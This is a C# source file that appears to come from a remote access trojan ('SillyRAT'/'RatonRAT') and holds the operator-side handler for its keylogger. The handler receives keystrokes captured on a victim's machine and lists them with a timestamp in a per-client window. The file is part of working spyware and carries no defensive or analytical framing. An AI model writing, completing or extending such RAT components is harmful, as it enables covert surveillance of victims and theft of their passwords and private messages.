using System;
using System.Drawing;
using System.Windows.Forms;
using SillyRAT;
using Server.Connection;
using RatonRAT.ClientForms;
using Stuff;

namespace Server.Handlers
{
    internal class HandleKeylogger
    {
        public HandleKeylogger(SillyClient SillyClient, Unpack msgUnpack)
        {
            string formName = "Keylogger | Client ID: ";
            FormKeylogger keyloggerForm = (FormKeylogger)Application.OpenForms[formName + msgUnpack.GetAsString("UID")];

            if (keyloggerForm != null)
            {
                if (keyloggerForm.SillyClient == null)
                {
                    keyloggerForm.SillyClient = SillyClient;
                }

                keyloggerForm.Invoke(new MethodInvoker(() =>
                {
                    string keys = msgUnpack.GetAsString("Keys");
                    keyloggerForm.listView1.BeginUpdate();
                        string timeStamp = DateTime.Now.ToString("HH:mm:ss");
                        ListViewItem listViewItem = new ListViewItem(timeStamp);
                        listViewItem.SubItems.Add(keys);
                        keyloggerForm.listView1.Items.Add(listViewItem);
                    keyloggerForm.listView1.EndUpdate();
                    keyloggerForm.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                }));
            }
        }
    }
}
